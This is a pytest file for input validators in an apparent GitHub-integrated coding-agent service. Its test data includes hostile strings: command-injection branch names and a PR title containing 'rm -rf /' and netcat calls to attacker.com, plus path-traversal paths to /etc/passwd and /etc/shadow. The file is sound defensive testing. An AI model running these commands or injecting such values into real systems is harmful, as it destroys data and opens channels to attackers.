"""Unit tests for validators that don't require database setup."""

import pytest
import sys
import os

# Add parent directory to path to import validators directly
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.validators import TaskInputValidator, GitHubIntegrationValidator


class TestTaskInputValidator:
    """Test task input validation."""
    
    def test_valid_inputs(self):
        """Test that valid inputs pass validation."""
        valid = TaskInputValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            repo_url="https://github.com/user/repo.git",
            target_branch="main",
            prompt="Fix the bug",
            model="claude"
        )
        assert valid.repo_url == "https://github.com/user/repo.git"
        assert valid.target_branch == "main"
        assert valid.model == "claude"
        assert valid.prompt == "Fix the bug"
    
    def test_command_injection_in_branch(self):
        """Test command injection attempts in branch names."""
        dangerous_branches = [
            "main; rm -rf /",
            "dev && malicious_command",
            "test | nc attacker.com 1234",
            "branch`whoami`",
            "feature$(id)",
        ]
        
        for branch in dangerous_branches:
            with pytest.raises(ValueError, match="Invalid branch name"):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch=branch,
                    prompt="Test",
                    model="claude"
                )
    
    def test_path_traversal_in_branch(self):
        """Test path traversal attempts."""
        traversal_branches = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/shadow",
            "~/../../root",
        ]
        
        for branch in traversal_branches:
            with pytest.raises(ValueError, match="path traversal"):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch=branch,
                    prompt="Test",
                    model="claude"
                )
    
    def test_invalid_repo_urls(self):
        """Test invalid repository URLs."""
        invalid_urls = [
            "http://github.com/user/repo.git",  # Not HTTPS
            "https://gitlab.com/user/repo.git",  # Wrong host
            "https://github.com/user/repo",      # Missing .git
            "https://github.com/user/repo.git; echo pwned",  # Injection
            "not-a-url",
            "",
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError, match="Invalid repository URL"):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url=url,
                    target_branch="main",
                    prompt="Test",
                    model="claude"
                )
    
    def test_invalid_models(self):
        """Test invalid model selection."""
        invalid_models = ["gpt-4", "llama", "claude-3", "Codex", "CLAUDE"]
        
        for model in invalid_models:
            with pytest.raises(ValueError, match="Invalid model"):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch="main",
                    prompt="Test",
                    model=model
                )
    
    def test_prompt_null_bytes_removed(self):
        """Test that null bytes are removed from prompts."""
        prompt_with_nulls = "Fix bug\x00malicious\x00code"
        valid = TaskInputValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            repo_url="https://github.com/user/repo.git",
            target_branch="main",
            prompt=prompt_with_nulls,
            model="claude"
        )
        assert "\x00" not in valid.prompt
        assert "Fix bugmaliciouscode" == valid.prompt


class TestGitHubIntegrationValidator:
    """Test GitHub integration validation."""
    
    def test_valid_pr_inputs(self):
        """Test valid PR inputs."""
        valid = GitHubIntegrationValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            base_branch="main",
            pr_title="Fix authentication",
            pr_body="This fixes the auth bug"
        )
        assert valid.base_branch == "main"
        assert valid.pr_title == "Fix authentication"
    
    def test_pr_title_sanitization(self):
        """Test PR title is sanitized."""
        title_with_special = "Fix bug; rm -rf / && echo 'pwned' | nc attacker.com"
        valid = GitHubIntegrationValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            base_branch="main",
            pr_title=title_with_special,
            pr_body="Test"
        )
        # Dangerous characters should be removed
        assert ";" not in valid.pr_title
        assert "|" not in valid.pr_title
        assert "&" not in valid.pr_title
        assert "rm -rf" in valid.pr_title  # Text is kept, just special chars removed
    
    def test_length_limits(self):
        """Test length limits are enforced."""
        long_title = "A" * 300
        long_body = "B" * 6000
        
        valid = GitHubIntegrationValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            base_branch="main",
            pr_title=long_title,
            pr_body=long_body
        )
        
        assert len(valid.pr_title) <= 200
        assert len(valid.pr_body) <= 5000


if __name__ == "__main__":
    pytest.main([__file__, "-v"])